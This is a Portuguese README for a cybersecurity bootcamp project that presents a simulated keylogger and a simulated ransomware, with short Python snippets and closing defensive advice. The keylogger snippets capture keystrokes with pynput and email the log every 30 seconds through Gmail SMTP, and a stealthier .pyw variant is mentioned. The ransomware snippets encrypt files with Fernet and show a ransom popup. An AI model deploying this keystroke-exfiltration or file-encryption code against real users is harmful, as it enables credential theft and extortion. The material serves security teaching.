# Santander Bootcamp - Projeto2

# 🛡️ Simulação de Malware Educacional com Python
Ransomware + Keylogger | Santander Bootcamp Cibersegurança

Este repositório contém a implementação de dois malwares simulados e controlados, desenvolvidos com fins exclusivamente educacionais:

Keylogger Simulado

Ransomware Simulado

Todo o ambiente foi preparado para estudos de segurança ofensiva e defensiva, permitindo compreender na prática como essas ameaças funcionam.

    ⚠️ Aviso Ético:
    Estes scripts não devem ser utilizados fora de ambientes controlados, sob qualquer circunstância.

## 📂 Estrutura do Repositório
```
SANTANDER_BOOTCAMP-CIBERSEGURANCA/
│
├── keylogger_simulado/
│   ├── .env
│   ├── keylogger_email.py
│   ├── keylogger.pyw
│   ├── log.txt
│
├── ransomware_simulado/
│   ├── arquivos/
│   ├── chave.key
│   ├── ransomware.py
│
└── README.md
```

## 🕵️ Keylogger Simulado

O keylogger simulado demonstra como malwares de captura de teclado coletam informações e enviam automaticamente para um agente externo ou apenas gravando num arquivo .txt, isso
irá depender de qual dos dois programas presentes no diretório foi executado.

### 📌 Funcionamento

O funcionamento descrito abaixo se refere à versão onde o programa envia os resultados
para o email, mas a versão que apenas grava no arquivo .txt funciona da mesma forma em linahs gerais.

- Captura teclas usando a biblioteca pynput
- Armazena as teclas em uma variável log
- A cada 30 segundos, dispara um envio automático via SMTP
- Usa variáveis de ambiente para proteger credenciais
- Ignora teclas como Shift, Ctrl, Alt etc.
- Possui versão “furtiva” com extensão .pyw

## 🔍 Trechos relevantes do código

### 1. Captura de teclas
```
def on_press(key):
    try:
        log += key.char          # captura caracteres normais
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
```

### 2. Lista de teclas ignoradas
```
IGNORE_KEYS = {
    keyboard.Key.shift,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
}
```

### 3. Envio automático
```
def enviar_email():
    msg = MIMEText(log)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_ORIGEM, SENHA_EMAIL)
    server.send_message(msg)

    Timer(30, enviar_email).start()  # loop de envio
```

## ▶️ Como executar o Keylogger
### 1. Instale as dependências:
```
pip install pynput python-dotenv
```

### 2. Configure o arquivo .env dentro da pasta do keylogger:
```
EMAIL_ORIGEM=seu_email@gmail.com
EMAIL_DESTINO=seu_email@gmail.com
SENHA_EMAIL=senha_ou_app_password
```

### 3. Execute:
```
python keylogger_simulado/keylogger_email.py
```

Para uma execução mais silenciosa, mas sem envio do email, aspenas gravação no arquivo log.txt:
```
python keylogger_simulado/keylogger.pyw
```

## 💣 Ransomware Simulado

Este ransomware educacional demonstra:

- Geração de chave

- Criptografia com Fernet (AES 128)

- Descriptografia

- Listagem recursiva de arquivos

- Exibição de mensagem de resgate via GUI

Nada é destruído: arquivos são restaurados imediatamente após o teste.

## 🔍 Trechos relevantes do código

### 1. Geração da chave de criptografia:
```
def gerar_chave_criptografica():
    chave = Fernet.generate_key()
    open("chave.key", "wb").write(chave)
```

### 2. Criptografar um arquivo:
```
def criptografar(arquivo, chave):
    f = Fernet(chave)
    dados = open(arquivo, "rb").read()
    dados_encriptados = f.encrypt(dados)
    open(arquivo, "wb").write(dados_encriptados)
```

### 3. Decriptografar arquivos recursivamente:
```
def decriptografar(arquivo, chave):
    f = Fernet(chave)
    dados = f.decrypt(open(arquivo, "rb").read())
    open(arquivo, "wb").write(dados)
```

### 4. Buscar arquivos recursivamente:
```
for raiz, _, arquivos in os.walk("ransomware_simulado/arquivos"):
    for nome in arquivos:
        paths.append(os.path.join(raiz, nome))
```

### 5. Mensagem de resgate:
```
messagebox.showinfo("LEIA ISSO!", "Seus arquivos foram criptografados...")
```

## ▶️ Como executar o Ransomware

### 1. Instale as dependências:
```
pip install pynput python-dotenv
```

### 2. Coloque arquivos de teste em:
```
/ransomware_simulado/arquivos
```

### 3. Execute
```
python ransomware_simulado/ransomware.py
```

## 🛡️ Medidas de Defesa e Prevenção
✔ Antivírus e Anti-malware
Detectam comportamento suspeito e keylogging.

✔ Firewalls
Bloqueiam comunicação com servidores externos.

✔ Sandboxing
Permite executar arquivos desconhecidos isoladamente.

✔ Backups regulares
Principal defesa contra ransomware.

✔ Atualizações constantes
Reduzem vulnerabilidades exploráveis.

✔ Educação do usuário
A maioria dos ataques começa com engenharia social.